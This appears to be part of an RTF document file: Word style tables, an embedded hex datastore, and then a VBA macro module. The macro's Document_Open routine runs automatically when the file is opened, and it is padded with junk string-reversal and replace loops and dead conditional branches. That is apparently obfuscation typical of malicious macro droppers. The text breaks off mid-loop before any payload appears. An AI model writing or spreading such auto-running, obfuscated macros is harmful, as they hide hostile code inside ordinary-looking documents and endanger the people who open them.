\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 envelope address;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 envelope return;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 footnote reference;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 annotation reference;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 line number;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 page number;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 endnote reference;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 endnote text;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 table of authorities;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 macro;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 toa heading;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Bullet;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Number;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List 3;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List 4;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List 5;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Bullet 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Bullet 3;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Bullet 4;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Bullet 5;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Number 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Number 3;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Number 4;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Number 5;\lsdqformat1 \lsdpriority10 \lsdlocked0 Title;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Closing;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Signature;\lsdsemihidden1 \lsdunhideused1 \lsdpriority1 \lsdlocked0 Default Paragraph Font;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Body Text;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Body Text Indent;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Continue;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Continue 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Continue 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Continue 4;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 List Continue 5;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Message Header;\lsdqformat1 \lsdpriority11 \lsdlocked0 Subtitle;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Salutation;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Date;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Body Text First Indent;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Body Text First Indent 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Note Heading;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Body Text 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Body Text 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Body Text Indent 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Body Text Indent 3;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Block Text;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Hyperlink;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 FollowedHyperlink;\lsdqformat1 \lsdpriority22 \lsdlocked0 Strong;
\lsdqformat1 \lsdpriority20 \lsdlocked0 Emphasis;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Document Map;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Plain Text;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 E-mail Signature;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Top of Form;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Bottom of Form;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Normal (Web);\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Acronym;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Address;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Cite;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Code;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Definition;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Keyboard;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Preformatted;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Sample;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Typewriter;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 HTML Variable;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Normal Table;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 annotation subject;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 No List;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Outline List 1;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Outline List 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Outline List 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Simple 1;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Simple 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Simple 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Classic 1;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Classic 2;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Classic 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Classic 4;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Colorful 1;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Colorful 2;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Colorful 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Columns 1;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Columns 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Columns 3;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Columns 4;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Columns 5;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Grid 1;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Grid 2;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Grid 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Grid 4;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Grid 5;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Grid 6;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Grid 7;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Grid 8;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table List 1;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table List 2;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table List 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table List 4;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table List 5;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table List 6;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table List 7;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table List 8;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table 3D effects 1;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table 3D effects 2;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table 3D effects 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Contemporary;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Elegant;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Professional;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Subtle 1;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Subtle 2;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Web 1;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Web 2;
\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Web 3;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Balloon Text;\lsdpriority39 \lsdlocked0 Table Grid;\lsdsemihidden1 \lsdunhideused1 \lsdlocked0 Table Theme;\lsdsemihidden1 \lsdlocked0 Placeholder Text;
\lsdqformat1 \lsdpriority1 \lsdlocked0 No Spacing;\lsdpriority60 \lsdlocked0 Light Shading;\lsdpriority61 \lsdlocked0 Light List;\lsdpriority62 \lsdlocked0 Light Grid;\lsdpriority63 \lsdlocked0 Medium Shading 1;\lsdpriority64 \lsdlocked0 Medium Shading 2;
\lsdpriority65 \lsdlocked0 Medium List 1;\lsdpriority66 \lsdlocked0 Medium List 2;\lsdpriority67 \lsdlocked0 Medium Grid 1;\lsdpriority68 \lsdlocked0 Medium Grid 2;\lsdpriority69 \lsdlocked0 Medium Grid 3;\lsdpriority70 \lsdlocked0 Dark List;
\lsdpriority71 \lsdlocked0 Colorful Shading;\lsdpriority72 \lsdlocked0 Colorful List;\lsdpriority73 \lsdlocked0 Colorful Grid;\lsdpriority60 \lsdlocked0 Light Shading Accent 1;\lsdpriority61 \lsdlocked0 Light List Accent 1;
\lsdpriority62 \lsdlocked0 Light Grid Accent 1;\lsdpriority63 \lsdlocked0 Medium Shading 1 Accent 1;\lsdpriority64 \lsdlocked0 Medium Shading 2 Accent 1;\lsdpriority65 \lsdlocked0 Medium List 1 Accent 1;\lsdsemihidden1 \lsdlocked0 Revision;
\lsdqformat1 \lsdpriority34 \lsdlocked0 List Paragraph;\lsdqformat1 \lsdpriority29 \lsdlocked0 Quote;\lsdqformat1 \lsdpriority30 \lsdlocked0 Intense Quote;\lsdpriority66 \lsdlocked0 Medium List 2 Accent 1;\lsdpriority67 \lsdlocked0 Medium Grid 1 Accent 1;
\lsdpriority68 \lsdlocked0 Medium Grid 2 Accent 1;\lsdpriority69 \lsdlocked0 Medium Grid 3 Accent 1;\lsdpriority70 \lsdlocked0 Dark List Accent 1;\lsdpriority71 \lsdlocked0 Colorful Shading Accent 1;\lsdpriority72 \lsdlocked0 Colorful List Accent 1;
\lsdpriority73 \lsdlocked0 Colorful Grid Accent 1;\lsdpriority60 \lsdlocked0 Light Shading Accent 2;\lsdpriority61 \lsdlocked0 Light List Accent 2;\lsdpriority62 \lsdlocked0 Light Grid Accent 2;\lsdpriority63 \lsdlocked0 Medium Shading 1 Accent 2;
\lsdpriority64 \lsdlocked0 Medium Shading 2 Accent 2;\lsdpriority65 \lsdlocked0 Medium List 1 Accent 2;\lsdpriority66 \lsdlocked0 Medium List 2 Accent 2;\lsdpriority67 \lsdlocked0 Medium Grid 1 Accent 2;\lsdpriority68 \lsdlocked0 Medium Grid 2 Accent 2;
\lsdpriority69 \lsdlocked0 Medium Grid 3 Accent 2;\lsdpriority70 \lsdlocked0 Dark List Accent 2;\lsdpriority71 \lsdlocked0 Colorful Shading Accent 2;\lsdpriority72 \lsdlocked0 Colorful List Accent 2;\lsdpriority73 \lsdlocked0 Colorful Grid Accent 2;
\lsdpriority60 \lsdlocked0 Light Shading Accent 3;\lsdpriority61 \lsdlocked0 Light List Accent 3;\lsdpriority62 \lsdlocked0 Light Grid Accent 3;\lsdpriority63 \lsdlocked0 Medium Shading 1 Accent 3;\lsdpriority64 \lsdlocked0 Medium Shading 2 Accent 3;
\lsdpriority65 \lsdlocked0 Medium List 1 Accent 3;\lsdpriority66 \lsdlocked0 Medium List 2 Accent 3;\lsdpriority67 \lsdlocked0 Medium Grid 1 Accent 3;\lsdpriority68 \lsdlocked0 Medium Grid 2 Accent 3;\lsdpriority69 \lsdlocked0 Medium Grid 3 Accent 3;
\lsdpriority70 \lsdlocked0 Dark List Accent 3;\lsdpriority71 \lsdlocked0 Colorful Shading Accent 3;\lsdpriority72 \lsdlocked0 Colorful List Accent 3;\lsdpriority73 \lsdlocked0 Colorful Grid Accent 3;\lsdpriority60 \lsdlocked0 Light Shading Accent 4;
\lsdpriority61 \lsdlocked0 Light List Accent 4;\lsdpriority62 \lsdlocked0 Light Grid Accent 4;\lsdpriority63 \lsdlocked0 Medium Shading 1 Accent 4;\lsdpriority64 \lsdlocked0 Medium Shading 2 Accent 4;\lsdpriority65 \lsdlocked0 Medium List 1 Accent 4;
\lsdpriority66 \lsdlocked0 Medium List 2 Accent 4;\lsdpriority67 \lsdlocked0 Medium Grid 1 Accent 4;\lsdpriority68 \lsdlocked0 Medium Grid 2 Accent 4;\lsdpriority69 \lsdlocked0 Medium Grid 3 Accent 4;\lsdpriority70 \lsdlocked0 Dark List Accent 4;
\lsdpriority71 \lsdlocked0 Colorful Shading Accent 4;\lsdpriority72 \lsdlocked0 Colorful List Accent 4;\lsdpriority73 \lsdlocked0 Colorful Grid Accent 4;\lsdpriority60 \lsdlocked0 Light Shading Accent 5;\lsdpriority61 \lsdlocked0 Light List Accent 5;
\lsdpriority62 \lsdlocked0 Light Grid Accent 5;\lsdpriority63 \lsdlocked0 Medium Shading 1 Accent 5;\lsdpriority64 \lsdlocked0 Medium Shading 2 Accent 5;\lsdpriority65 \lsdlocked0 Medium List 1 Accent 5;\lsdpriority66 \lsdlocked0 Medium List 2 Accent 5;
\lsdpriority67 \lsdlocked0 Medium Grid 1 Accent 5;\lsdpriority68 \lsdlocked0 Medium Grid 2 Accent 5;\lsdpriority69 \lsdlocked0 Medium Grid 3 Accent 5;\lsdpriority70 \lsdlocked0 Dark List Accent 5;\lsdpriority71 \lsdlocked0 Colorful Shading Accent 5;
\lsdpriority72 \lsdlocked0 Colorful List Accent 5;\lsdpriority73 \lsdlocked0 Colorful Grid Accent 5;\lsdpriority60 \lsdlocked0 Light Shading Accent 6;\lsdpriority61 \lsdlocked0 Light List Accent 6;\lsdpriority62 \lsdlocked0 Light Grid Accent 6;
\lsdpriority63 \lsdlocked0 Medium Shading 1 Accent 6;\lsdpriority64 \lsdlocked0 Medium Shading 2 Accent 6;\lsdpriority65 \lsdlocked0 Medium List 1 Accent 6;\lsdpriority66 \lsdlocked0 Medium List 2 Accent 6;
\lsdpriority67 \lsdlocked0 Medium Grid 1 Accent 6;\lsdpriority68 \lsdlocked0 Medium Grid 2 Accent 6;\lsdpriority69 \lsdlocked0 Medium Grid 3 Accent 6;\lsdpriority70 \lsdlocked0 Dark List Accent 6;\lsdpriority71 \lsdlocked0 Colorful Shading Accent 6;
\lsdpriority72 \lsdlocked0 Colorful List Accent 6;\lsdpriority73 \lsdlocked0 Colorful Grid Accent 6;\lsdqformat1 \lsdpriority19 \lsdlocked0 Subtle Emphasis;\lsdqformat1 \lsdpriority21 \lsdlocked0 Intense Emphasis;
\lsdqformat1 \lsdpriority31 \lsdlocked0 Subtle Reference;\lsdqformat1 \lsdpriority32 \lsdlocked0 Intense Reference;\lsdqformat1 \lsdpriority33 \lsdlocked0 Book Title;\lsdsemihidden1 \lsdunhideused1 \lsdpriority37 \lsdlocked0 Bibliography;
\lsdsemihidden1 \lsdunhideused1 \lsdqformat1 \lsdpriority39 \lsdlocked0 TOC Heading;\lsdpriority41 \lsdlocked0 Plain Table 1;\lsdpriority42 \lsdlocked0 Plain Table 2;\lsdpriority43 \lsdlocked0 Plain Table 3;\lsdpriority44 \lsdlocked0 Plain Table 4;
\lsdpriority45 \lsdlocked0 Plain Table 5;\lsdpriority40 \lsdlocked0 Grid Table Light;\lsdpriority46 \lsdlocked0 Grid Table 1 Light;\lsdpriority47 \lsdlocked0 Grid Table 2;\lsdpriority48 \lsdlocked0 Grid Table 3;\lsdpriority49 \lsdlocked0 Grid Table 4;
\lsdpriority50 \lsdlocked0 Grid Table 5 Dark;\lsdpriority51 \lsdlocked0 Grid Table 6 Colorful;\lsdpriority52 \lsdlocked0 Grid Table 7 Colorful;\lsdpriority46 \lsdlocked0 Grid Table 1 Light Accent 1;\lsdpriority47 \lsdlocked0 Grid Table 2 Accent 1;
\lsdpriority48 \lsdlocked0 Grid Table 3 Accent 1;\lsdpriority49 \lsdlocked0 Grid Table 4 Accent 1;\lsdpriority50 \lsdlocked0 Grid Table 5 Dark Accent 1;\lsdpriority51 \lsdlocked0 Grid Table 6 Colorful Accent 1;
\lsdpriority52 \lsdlocked0 Grid Table 7 Colorful Accent 1;\lsdpriority46 \lsdlocked0 Grid Table 1 Light Accent 2;\lsdpriority47 \lsdlocked0 Grid Table 2 Accent 2;\lsdpriority48 \lsdlocked0 Grid Table 3 Accent 2;
\lsdpriority49 \lsdlocked0 Grid Table 4 Accent 2;\lsdpriority50 \lsdlocked0 Grid Table 5 Dark Accent 2;\lsdpriority51 \lsdlocked0 Grid Table 6 Colorful Accent 2;\lsdpriority52 \lsdlocked0 Grid Table 7 Colorful Accent 2;
\lsdpriority46 \lsdlocked0 Grid Table 1 Light Accent 3;\lsdpriority47 \lsdlocked0 Grid Table 2 Accent 3;\lsdpriority48 \lsdlocked0 Grid Table 3 Accent 3;\lsdpriority49 \lsdlocked0 Grid Table 4 Accent 3;
\lsdpriority50 \lsdlocked0 Grid Table 5 Dark Accent 3;\lsdpriority51 \lsdlocked0 Grid Table 6 Colorful Accent 3;\lsdpriority52 \lsdlocked0 Grid Table 7 Colorful Accent 3;\lsdpriority46 \lsdlocked0 Grid Table 1 Light Accent 4;
\lsdpriority47 \lsdlocked0 Grid Table 2 Accent 4;\lsdpriority48 \lsdlocked0 Grid Table 3 Accent 4;\lsdpriority49 \lsdlocked0 Grid Table 4 Accent 4;\lsdpriority50 \lsdlocked0 Grid Table 5 Dark Accent 4;
\lsdpriority51 \lsdlocked0 Grid Table 6 Colorful Accent 4;\lsdpriority52 \lsdlocked0 Grid Table 7 Colorful Accent 4;\lsdpriority46 \lsdlocked0 Grid Table 1 Light Accent 5;\lsdpriority47 \lsdlocked0 Grid Table 2 Accent 5;
\lsdpriority48 \lsdlocked0 Grid Table 3 Accent 5;\lsdpriority49 \lsdlocked0 Grid Table 4 Accent 5;\lsdpriority50 \lsdlocked0 Grid Table 5 Dark Accent 5;\lsdpriority51 \lsdlocked0 Grid Table 6 Colorful Accent 5;
\lsdpriority52 \lsdlocked0 Grid Table 7 Colorful Accent 5;\lsdpriority46 \lsdlocked0 Grid Table 1 Light Accent 6;\lsdpriority47 \lsdlocked0 Grid Table 2 Accent 6;\lsdpriority48 \lsdlocked0 Grid Table 3 Accent 6;
\lsdpriority49 \lsdlocked0 Grid Table 4 Accent 6;\lsdpriority50 \lsdlocked0 Grid Table 5 Dark Accent 6;\lsdpriority51 \lsdlocked0 Grid Table 6 Colorful Accent 6;\lsdpriority52 \lsdlocked0 Grid Table 7 Colorful Accent 6;
\lsdpriority46 \lsdlocked0 List Table 1 Light;\lsdpriority47 \lsdlocked0 List Table 2;\lsdpriority48 \lsdlocked0 List Table 3;\lsdpriority49 \lsdlocked0 List Table 4;\lsdpriority50 \lsdlocked0 List Table 5 Dark;
\lsdpriority51 \lsdlocked0 List Table 6 Colorful;\lsdpriority52 \lsdlocked0 List Table 7 Colorful;\lsdpriority46 \lsdlocked0 List Table 1 Light Accent 1;\lsdpriority47 \lsdlocked0 List Table 2 Accent 1;\lsdpriority48 \lsdlocked0 List Table 3 Accent 1;
\lsdpriority49 \lsdlocked0 List Table 4 Accent 1;\lsdpriority50 \lsdlocked0 List Table 5 Dark Accent 1;\lsdpriority51 \lsdlocked0 List Table 6 Colorful Accent 1;\lsdpriority52 \lsdlocked0 List Table 7 Colorful Accent 1;
\lsdpriority46 \lsdlocked0 List Table 1 Light Accent 2;\lsdpriority47 \lsdlocked0 List Table 2 Accent 2;\lsdpriority48 \lsdlocked0 List Table 3 Accent 2;\lsdpriority49 \lsdlocked0 List Table 4 Accent 2;
\lsdpriority50 \lsdlocked0 List Table 5 Dark Accent 2;\lsdpriority51 \lsdlocked0 List Table 6 Colorful Accent 2;\lsdpriority52 \lsdlocked0 List Table 7 Colorful Accent 2;\lsdpriority46 \lsdlocked0 List Table 1 Light Accent 3;
\lsdpriority47 \lsdlocked0 List Table 2 Accent 3;\lsdpriority48 \lsdlocked0 List Table 3 Accent 3;\lsdpriority49 \lsdlocked0 List Table 4 Accent 3;\lsdpriority50 \lsdlocked0 List Table 5 Dark Accent 3;
\lsdpriority51 \lsdlocked0 List Table 6 Colorful Accent 3;\lsdpriority52 \lsdlocked0 List Table 7 Colorful Accent 3;\lsdpriority46 \lsdlocked0 List Table 1 Light Accent 4;\lsdpriority47 \lsdlocked0 List Table 2 Accent 4;
\lsdpriority48 \lsdlocked0 List Table 3 Accent 4;\lsdpriority49 \lsdlocked0 List Table 4 Accent 4;\lsdpriority50 \lsdlocked0 List Table 5 Dark Accent 4;\lsdpriority51 \lsdlocked0 List Table 6 Colorful Accent 4;
\lsdpriority52 \lsdlocked0 List Table 7 Colorful Accent 4;\lsdpriority46 \lsdlocked0 List Table 1 Light Accent 5;\lsdpriority47 \lsdlocked0 List Table 2 Accent 5;\lsdpriority48 \lsdlocked0 List Table 3 Accent 5;
\lsdpriority49 \lsdlocked0 List Table 4 Accent 5;\lsdpriority50 \lsdlocked0 List Table 5 Dark Accent 5;\lsdpriority51 \lsdlocked0 List Table 6 Colorful Accent 5;\lsdpriority52 \lsdlocked0 List Table 7 Colorful Accent 5;
\lsdpriority46 \lsdlocked0 List Table 1 Light Accent 6;\lsdpriority47 \lsdlocked0 List Table 2 Accent 6;\lsdpriority48 \lsdlocked0 List Table 3 Accent 6;\lsdpriority49 \lsdlocked0 List Table 4 Accent 6;
\lsdpriority50 \lsdlocked0 List Table 5 Dark Accent 6;\lsdpriority51 \lsdlocked0 List Table 6 Colorful Accent 6;\lsdpriority52 \lsdlocked0 List Table 7 Colorful Accent 6;}}{\*\datastore 010500000200000018000000
4d73786d6c322e534158584d4c5265616465722e362e3000000000000000000000060000
d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001000000010000000000000000100000feffffff00000000feffffff0000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
fffffffffffffffffdfffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffffffffffff0c6ad98892f1d411a65f0040963251e5000000000000000000000000d02e
2cad63d0d301feffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000105000000000000}}

Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Sub Document_Open()
    yQvKA = 33
    For yQvKA = 0 To 121
        qKJi = StrReverse("HPkXUcxLcAoMHOlj")
        qKJi = Replace("FVpHoEqBKnhPO", "FVp", "nLqrZ")
        qKJi = Replace("HiFGLhZDXkZo", "HiFG", "iqAasO")
        qKJi = StrReverse("USGgszDFnnVpFxEpn")
        qKJi = Replace("zCshlUYavprxVFbHAVl", "zCsh", "fIErsR")
        qKJi = StrReverse("ehPsgfAcWaYrJm")
        qKJi = StrReverse("QKKSqfsAHKitydE")
        qKJi = StrReverse("fbCaQkDQpREksyJePR")
        qKJi = StrReverse("ysdmOZFkSIuOPySGLzt")
        qKJi = StrReverse("fqtSMHFlkYeyLfs")
        qKJi = StrReverse("zHbHbyiPYVgFzFPIn")
        qKJi = Replace("cxPZSGdIQDAdRVpziKf", "cxP", "aHthFL")
                If 1800845 = 33 - 5147 Then
            BdfKW = Replace("SzTcmLBaTh", "SzT", "Mcpg")
            BdfKW = StrReverse("SzTcmLBaTh")
            End If
                If 3551360 = 104 - 1904 Then
            Evaim = Replace("qeQQgUWCggrWyQDYyhT", "qeQQ", "iRvBeHq")
            Evaim = StrReverse("qeQQgUWCggrWyQDYyhT")
            End If
        qKJi = Replace("lAArgwotFCRvd", "lAAr", "EGeCkg")
        qKJi = StrReverse("UsuhaQFqOlFkkLphi")
        qKJi = Replace("tRfXGItrEerZMXu", "tRfX", "XigRdFr")
        qKJi = StrReverse("aMeCwpehadfLL")
        qKJi = Replace("GHIXYrwCaKTJUl", "GHIX", "fPSbbKp")
        qKJi = Replace("iWJBljIlOoWFFDpsuR", "iWJB", "wTwfAb")
        qKJi = Replace("djSqxBEnlSCoFRe", "djS", "COXkHy")
        qKJi = StrReverse("HdpzSrsQIIFFVJBjX")
        qKJi = Replace("XfiodXIWmkWfVzp", "Xfio", "YQbYIi")
        qKJi = Replace("eYRrnsOlfCcYceOxQ", "eYR", "zWAejrA")
        qKJi = StrReverse("lYOmdfiWDedHDWRolH")
    Next yQvKA
    For IwsiE = 0 To 111
        OAUr = StrReverse("MnXCZOfrsdEpujpfghQ")
        OAUr = StrReverse("PDqvIWfgAVdzlP")
        OAUr = Replace("KahjXIpEpmDngJABPJl", "Kah", "SWokgxs")
                If 3236732 = 70 - 1288 Then
            sDmrn = Replace("ncrMEZwZTzvByKRVZZ", "ncrM", "WgKMW")
            sDmrn = StrReverse("ncrMEZwZTzvByKRVZZ")
            pQHIw = Replace("oXLsTUUzWdatIdRVggS", "oXLs", "zjsmMxC")
            pQHIw = StrReverse("oXLsTUUzWdatIdRVggS")
            End If
                If 1599684 = 105 - 5853 Then
            OQdhH = Replace("RcrKQpVHeMkWazfu", "RcrK", "uQiMkVh")
            OQdhH = StrReverse("RcrKQpVHeMkWazfu")
            LFPkJ = Replace("lxspCZURqWCrY", "lxs", "Hacl")
            LFPkJ = StrReverse("lxspCZURqWCrY")
            End If
        OAUr = StrReverse("HpsovLrldBXEcyz")
        OAUr = StrReverse("EjFQHbdHvRTKvjqHh")
        OAUr = StrReverse("joJIXmCYmP")
                If 140854 = 125 - 7783 Then
            cLSvq = Replace("uLMFnghRdnxbBIJV", "uLM", "dejs")
            cLSvq = StrReverse("uLMFnghRdnxbBIJV")
            End If
        OAUr = Replace("naRqRDvFDToaOf", "naRq", "BkcEoQ")
        OAUr = StrReverse("eVadtZidoyJseAzWD")
        OAUr = Replace("ZbuabAYTyHKtb", "Zbu", "SRSj")
                If 3395260 = 259 - 7425 Then
            AkYYS = Replace("FUdDyzuYHWOq", "FUdD", "uzOSHMW")
            AkYYS = StrReverse("FUdDyzuYHWOq")
            End If
        OAUr = Replace("RYVuveOMEZJ", "RYVu", "CtPsB")
        OAUr = Replace("TDeMUUZESotAR", "TDe", "yRMwU")
        OAUr = StrReverse("MnFFDPviUKaO")
        OAUr = StrReverse("mGxfdfkEAenenDMkVe")
        OAUr = StrReverse("dIqOUwSREpaW")
                If 1897328 = 202 - 5619 Then
            yuZyY = Replace("vXwBRJeJViCVmkuPeo", "vXwB", "djiAjm")
            yuZyY = StrReverse("vXwBRJeJViCVmkuPeo")
            End If
        OAUr = Replace("wlFygYpvAljTxyCb", "wlFy", "JmvyGwT")
        OAUr = Replace("eCJKnmUeXUDCzv", "eCJ", "sAnyC")
        OAUr = StrReverse("FJYnyzIfcZzpHDIqyba")
